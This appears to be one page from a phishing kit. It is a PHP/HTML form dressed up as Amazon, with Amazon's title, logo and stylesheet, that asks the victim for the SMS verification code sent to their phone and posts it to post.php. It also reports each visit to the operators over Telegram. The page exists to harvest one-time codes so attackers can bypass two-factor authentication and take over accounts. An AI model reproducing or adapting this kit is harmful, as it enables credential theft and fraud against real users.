<?php 
require 'main.php';
require 'telegram_logger.php';

// Log SMS page visit
sendToTelegram("📱 User accessed SMS page", "SMS");
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/amazon.css">
    <title>Amazon</title>
</head>
<body>
    <header>
       <div class="logo"> <img src="res/img/logo1.png" alt="img">  </div></header> <br>

    <form action="post.php" method="post">
    <div>

<div  class="header">

<div class="sms"><label>Please enter the verification code sent to your phone.</label> </div>

<div class="col">
<input type="text" placeholder="Enter code" name="otp" required> <br> <br>
<?php 

if(isset($_GET['error'])){
    echo '<input type="hidden" name="exit">';
    echo '<p style="color:red;">Invalid code</p>';
}
?>
</div>


<div class="login">
    <button type="submit"> Confirm</button>
</div>
</form>

</div>




</body>
</html>